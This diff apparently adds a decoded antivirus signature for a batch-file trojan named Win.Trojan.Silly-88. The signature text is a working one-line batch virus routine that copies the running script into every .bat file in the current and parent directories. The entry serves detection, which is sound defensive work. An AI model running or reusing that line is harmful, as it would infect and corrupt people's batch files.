@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Silly-88
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+for %%m in (*.bat ..\*.bat) do copy %0.bat+%0 %%m>nul
